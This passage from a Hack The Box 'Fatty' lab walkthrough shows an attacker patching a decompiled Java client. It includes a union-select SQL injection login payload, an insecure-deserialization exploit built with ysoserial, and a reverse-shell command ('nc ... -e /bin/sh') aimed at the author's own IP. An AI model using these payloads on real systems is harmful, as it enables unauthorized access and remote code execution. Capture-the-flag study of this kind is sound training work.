</span></span></code></pre></div><p>Putting our payload as username and <code>clarabibi</code> as password should be ok.</p><p>My injection gave me login failed, so I tried something else:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span><span style=color:#f92672>-cyfun&#39; union select 1337,&#39;qtc&#39;,&#39;qtc@fatty.htb&#39;,&#39;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#39;,&#39;admin
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+cyfun&#39; union select id,username,email,password,&#39;admin&#39; FROM users WHERE username=&#39;qtc
</span></span></span></code></pre></div><p>But still failing, let&rsquo;s get back to <code>setPassword</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setPassword</span>(String password) {
</span></span><span style=display:flex><span>  String hashString <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>+</span> password <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;clarabibimakeseverythingsecure&#34;</span>;
</span></span></code></pre></div><p><code>this.username</code> is used so since we&rsquo;re not providing only <code>qtc</code> anymore but our
SQL payload, the calculated hash will be wrong.</p><p>So let&rsquo;s patch it into:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setPassword</span>(String password) {
</span></span><span style=display:flex><span>  String hashString <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;qtc&#34;</span> <span style=color:#f92672>+</span> password <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;clarabibimakeseverythingsecure&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>But I couldn&rsquo;t modify the <code>User.java</code> file this way because the dependency
<code>import javax.xml.bind.DatatypeConverter;</code> was removed from Java 11+ and
we are using Java 14 for <a href=https://github.com/Col-E/Recaf>recaf</a> so if this file is touched it can&rsquo;t be recompiled
by <a href=https://github.com/Col-E/Recaf>recaf</a> unless you remove all references to <code>DatatypeConverter</code>.</p><p>So that&rsquo;s what I did, I removed the imported and change the whole <code>setPassword</code>
function to the following and did the same in User class:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setPassword</span>(String password) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Now we can login with:</p><ul><li>Username: <code>cyfun' union select id,username,email,password,'admin' FROM users WHERE username='qtc</code></li><li>Password: whatever or void because we hardcoded the hash</li></ul><p>Now we have to look at a vuln in an admin-only feature. The only feature
accepting an input is <code>changePW</code>.</p><p>On the server: <code>htb/fatty/server/methods/Commands.java</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>changePW</span>(ArrayList<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> args, User user) {
</span></span><span style=display:flex><span>  logger.<span style=color:#a6e22e>logInfo</span>(<span style=color:#e6db74>&#34;[+] Method &#39;changePW&#39; was called.&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> methodID <span style=color:#f92672>=</span> 7;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>user.<span style=color:#a6e22e>getRole</span>().<span style=color:#a6e22e>isAllowed</span>(methodID)) {
</span></span><span style=display:flex><span>    logger.<span style=color:#a6e22e>logError</span>(<span style=color:#e6db74>&#34;[+] Access denied. Method with id &#39;&#34;</span> <span style=color:#f92672>+</span> methodID <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; was called by user &#39;&#34;</span> <span style=color:#f92672>+</span> user.<span style=color:#a6e22e>getUsername</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; with role &#39;&#34;</span> <span style=color:#f92672>+</span> user.<span style=color:#a6e22e>getRoleName</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;.&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Error: Method &#39;changePW&#39; is not allowed for this user account&#34;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  String response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  String b64User <span style=color:#f92672>=</span> args.<span style=color:#a6e22e>get</span>(0);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> serializedUser <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getDecoder</span>().<span style=color:#a6e22e>decode</span>(b64User.<span style=color:#a6e22e>getBytes</span>());
</span></span><span style=display:flex><span>  ByteArrayInputStream bIn <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayInputStream(serializedUser);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    ObjectInputStream oIn <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(bIn);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    User user1 <span style=color:#f92672>=</span> (User)oIn.<span style=color:#a6e22e>readObject</span>();
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>    e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> response <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Error: Failure while recovering the User object.&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> response;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  response <span style=color:#f92672>=</span> response <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Info: Your call was successful, but the method is not fully implemented yet.&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> response;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can see on the server that an object is create from the user input <code>(User)oIn.readObject();</code>.</p><p>There is an article an associated code repository explaining unserialize exploits
in Java commons-collections library:</p><ul><li><a href=https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#thevulnerability>Article</a></li><li><a href=https://github.com/foxglovesec/JavaUnserializeExploits>Code</a></li></ul><p>It seems we have the vulnerable class InvokerTransformer and commons-collection:</p><pre tabindex=0><code>$ grep -r InvokerTransformer server_source
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */ public class InvokerTransformer
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  56 */     return new InvokerTransformer(methodName);
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  77 */       return new InvokerTransformer(methodName);
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  81 */     return new InvokerTransformer(methodName, paramTypes, args);
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */   private InvokerTransformer(String methodName) {
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */   public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 128 */       throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + this.iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; does not exist&#34;);
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 130 */       throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + this.iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; cannot be accessed&#34;);
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 132 */       throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + this.iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; threw an exception&#34;, ex);
server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* Location:              /home/cyfun/CTF/HackTheBox/machines/Fatty/fatty-server.jar!/org/apache/commons/collections/functors/InvokerTransformer.class
server_source/org/apache/commons/collections/ClosureUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;
server_source/org/apache/commons/collections/ClosureUtils.java:/* 160 */     return asClosure(InvokerTransformer.getInstance(methodName));
server_source/org/apache/commons/collections/ClosureUtils.java:/* 179 */     return asClosure(InvokerTransformer.getInstance(methodName, paramTypes, args));
server_source/org/apache/commons/collections/PredicateUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;
server_source/org/apache/commons/collections/PredicateUtils.java:/* 218 */     return asPredicate(InvokerTransformer.getInstance(methodName));
server_source/org/apache/commons/collections/PredicateUtils.java:/* 243 */     return asPredicate(InvokerTransformer.getInstance(methodName, paramTypes, args));
server_source/org/apache/commons/collections/TransformerUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;
server_source/org/apache/commons/collections/TransformerUtils.java:/* 407 */     return InvokerTransformer.getInstance(methodName, null, null);
server_source/org/apache/commons/collections/TransformerUtils.java:/* 425 */     return InvokerTransformer.getInstance(methodName, paramTypes, args);
</code></pre><p>However we don&rsquo;t know which version of the library is used.</p><h2 id=java-object-deserialization-exploit>Java object deserialization exploit<a hidden class=anchor aria-hidden=true href=#java-object-deserialization-exploit>#</a></h2><p>Let&rsquo;s craft a reverse shell with <a href=https://github.com/frohoff/ysoserial>ysoserial</a>:</p><pre tabindex=0><code>$ ysoserial CommonsCollections5 &#39;nc 10.10.14.89 8888 -e /bin/sh&#39; &gt; revshell.ser
</code></pre><p>But if we try to send it with receive this error, telling us the code on the
client is not totally finished.</p><p>Let&rsquo;s see where do this error comes from:</p><pre tabindex=0><code>$ grep -r &#39;Not implemented yet&#39; client_source
client_source/htb/fatty/client/gui/ClientGuiTest.java:/* 560 */             JOptionPane.showMessageDialog(passwordChange, &#34;Not implemented yet.&#34;, &#34;Error&#34;, 0);
</code></pre><p>The button is not mapped to <code>changePW</code> function.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>changePassword.<span style=color:#a6e22e>addActionListener</span>(<span style=color:#66d9ef>new</span> ActionListener()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>actionPerformed</span>(ActionEvent e) {
</span></span><span style=display:flex><span>        controlPanel.<span style=color:#a6e22e>setVisible</span>(<span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>        passwordChange.<span style=color:#a6e22e>setVisible</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pwChangeButton.<span style=color:#a6e22e>addActionListener</span>(<span style=color:#66d9ef>new</span> ActionListener()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>actionPerformed</span>(ActionEvent e) {
</span></span><span style=display:flex><span>        JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(passwordChange, <span style=color:#e6db74>&#34;Not implemented yet.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        passwordChange.<span style=color:#a6e22e>setVisible</span>(<span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>        controlPanel.<span style=color:#a6e22e>setVisible</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    });
</span></span></code></pre></div><p>Let&rsquo;s see <code>changePW</code> on the client: <code>htb/fatty/client/methods/Invoker.java</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>changePW</span>(String username, String newPassword) <span style=color:#66d9ef>throws</span> MessageParseException, MessageBuildException, IOException {
</span></span><span style=display:flex><span>  String methodName <span style=color:#f92672>=</span> (<span style=color:#66d9ef>new</span> Object() {  }).<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getEnclosingMethod</span>().<span style=color:#a6e22e>getName</span>();
</span></span><span style=display:flex><span>  logger.<span style=color:#a6e22e>logInfo</span>(<span style=color:#e6db74>&#34;[+] Method &#39;&#34;</span> <span style=color:#f92672>+</span> methodName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; was called by user &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>getUsername</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;.&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (AccessCheck.<span style=color:#a6e22e>checkAccess</span>(methodName, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>user</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Error: Method &#39;&#34;</span> <span style=color:#f92672>+</span> methodName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; is not allowed for this user account&#34;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  User user <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> User(username, newPassword);
</span></span><span style=display:flex><span>  ByteArrayOutputStream bOut <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    ObjectOutputStream oOut <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(bOut);
</span></span><span style=display:flex><span>    oOut.<span style=color:#a6e22e>writeObject</span>(user);
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (IOException e) {
</span></span><span style=display:flex><span>    e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Failure while serializing user object&#34;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> serializedUser64 <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getEncoder</span>().<span style=color:#a6e22e>encode</span>(bOut.<span style=color:#a6e22e>toByteArray</span>());
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>action</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ActionMessage(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sessionID</span>, <span style=color:#e6db74>&#34;changePW&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>action</span>.<span style=color:#a6e22e>addArgument</span>(<span style=color:#66d9ef>new</span> String(serializedUser64));
</span></span><span style=display:flex><span>  sendAndRecv();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>hasError</span>()) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Error: Your action caused an error on the application server!&#34;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>getContentAsString</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>So what we have to do is patch <code>pwChangeButton.addActionListener</code> and
replace</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(passwordChange, <span style=color:#e6db74>&#34;Not implemented yet.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span></code></pre></div><p>by</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.*;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    String data <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> String(Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;revshell.ser&#34;</span>)));
</span></span><span style=display:flex><span>    ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>invoker</span>.<span style=color:#a6e22e>changePW</span>(<span style=color:#e6db74>&#34;qtc&#34;</span>, data);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> (Exception e42) {
</span></span><span style=display:flex><span>    JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(passwordChange, <span style=color:#e6db74>&#34;WTF happened&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>    e42.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Also <code>changePW</code> will call the User class overloaded constructor with 2 args
<code>public User(String username, String password)</code> that will call the full User
constructor <code>User(int uid, String username, String password, String email, Role role)</code>.</p><p>But in the full constructor the password is hashed so we need to change it from:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/*     */</span>   <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>User</span>(<span style=color:#66d9ef>int</span> uid, String username, String password, String email, Role role) {
</span></span><span style=display:flex><span><span style=color:#75715e>/*  20 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>uid</span> <span style=color:#f92672>=</span> uid;
</span></span><span style=display:flex><span><span style=color:#75715e>/*  21 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> username;
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*  23 */</span>     String hashString <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>+</span> password <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;clarabibimakeseverythingsecure&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>/*  24 */</span>     MessageDigest digest <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>     <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span><span style=color:#75715e>/*  26 */</span>       digest <span style=color:#f92672>=</span> MessageDigest.<span style=color:#a6e22e>getInstance</span>(<span style=color:#e6db74>&#34;SHA-256&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>/*  27 */</span>     } <span style=color:#66d9ef>catch</span> (NoSuchAlgorithmException e) {
</span></span><span style=display:flex><span><span style=color:#75715e>/*  28 */</span>       e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>     }
</span></span><span style=display:flex><span><span style=color:#75715e>/*  30 */</span>     <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> hash <span style=color:#f92672>=</span> digest.<span style=color:#a6e22e>digest</span>(hashString.<span style=color:#a6e22e>getBytes</span>(StandardCharsets.<span style=color:#a6e22e>UTF_8</span>));
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*  32 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> DatatypeConverter.<span style=color:#a6e22e>printHexBinary</span>(hash);
</span></span><span style=display:flex><span><span style=color:#75715e>/*  33 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>email</span> <span style=color:#f92672>=</span> email;
</span></span><span style=display:flex><span><span style=color:#75715e>/*  34 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>role</span> <span style=color:#f92672>=</span> role;
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>   }
</span></span></code></pre></div><p>to</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>User</span>(<span style=color:#66d9ef>int</span> uid, String username, String password, String email, Role role) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>uid</span> <span style=color:#f92672>=</span> uid;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> username;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> password;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>email</span> <span style=color:#f92672>=</span> email;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>role</span> <span style=color:#f92672>=</span> role;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>But I always end with this error:</p><pre tabindex=0><code>java.io.NotSerializableException: htb.fatty.shared.resources.Role
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1184)
        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)
        at htb.fatty.client.methods.Invoker.changePW(Invoker.java:133)
        at htb.fatty.client.gui.ClientGuiTest$16.actionPerformed(ClientGuiTest.java:442)
        at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2022)
        at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2348)
        at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)
        at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)
        at javax.swing.AbstractButton.doClick(AbstractButton.java:376)
        at javax.swing.plaf.basic.BasicMenuItemUI.doClick(BasicMenuItemUI.java:842)
        at javax.swing.plaf.basic.BasicMenuItemUI$Handler.mouseReleased(BasicMenuItemUI.java:886)
        at java.awt.Component.processMouseEvent(Component.java:6539)
        at javax.swing.JComponent.processMouseEvent(JComponent.java:3324)
        at java.awt.Component.processEvent(Component.java:6304)
        at java.awt.Container.processEvent(Container.java:2239)
        at java.awt.Component.dispatchEventImpl(Component.java:4889)
        at java.awt.Container.dispatchEventImpl(Container.java:2297)
        at java.awt.Component.dispatchEvent(Component.java:4711)
        at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4904)
        at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4535)
        at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4476)
        at java.awt.Container.dispatchEventImpl(Container.java:2283)
        at java.awt.Window.dispatchEventImpl(Window.java:2746)
        at java.awt.Component.dispatchEvent(Component.java:4711)
        at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:760)
        at java.awt.EventQueue.access$500(EventQueue.java:97)
        at java.awt.EventQueue$3.run(EventQueue.java:709)
        at java.awt.EventQueue$3.run(EventQueue.java:703)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:74)
        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:84)
        at java.awt.EventQueue$4.run(EventQueue.java:733)
        at java.awt.EventQueue$4.run(EventQueue.java:731)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:74)
        at java.awt.EventQueue.dispatchEvent(EventQueue.java:730)
        at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:205)
        at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:116)
        at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:105)
        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:101)
        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:93)
        at java.awt.EventDispatchThread.run(EventDispatchThread.java:82)
</code></pre><p>The error is hit in this chunk of code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            ObjectOutputStream oOut <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(bOut);
</span></span><span style=display:flex><span>            oOut.<span style=color:#a6e22e>writeObject</span>(user);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (IOException e) {
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Failure while serializing user object&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span></code></pre></div><p>The user class is serializable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>implements</span> Serializable
</span></span></code></pre></div><p>but not the role class</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Role</span>
</span></span></code></pre></div><p>As said in <a href=https://stackoverflow.com/questions/13895867/why-does-writeobject-throw-java-io-notserializableexception-and-how-do-i-fix-it>this stackOverflow post</a>
we either need to:</p><ul><li>make the Role class <code>Serializable</code></li><li>mark the Role field as <code>transient</code> is it&rsquo;s unneeded in the serialized form</li></ul><p>So I added <code>implements Serializable</code> on the Role class, now I don&rsquo;t have error
on client side but instead <code>Error: Failure while recovering the User object.</code>
because it&rsquo;s a shared library so the client can now serialize it but the
server can&rsquo;t deserialize it as the shared library on server side remains untouched.</p><p>So I guess we will have to not serialize it. So I marked the field as</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>implements</span> Serializable {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> uid;
</span></span><span style=display:flex><span>    String username;
</span></span><span style=display:flex><span>    String password;
</span></span><span style=display:flex><span>    String email;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>transient</span> Role role;
</span></span></code></pre></div><p>but I ended up with the same deserialization error.</p><p>Because the server expect a user object, I thought that anything else would be
refused.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>User user1 <span style=color:#f92672>=</span> (User)oIn.<span style=color:#a6e22e>readObject</span>();
</span></span></code></pre></div><p>But in fact we should send our raw serialized payload without trying to package it
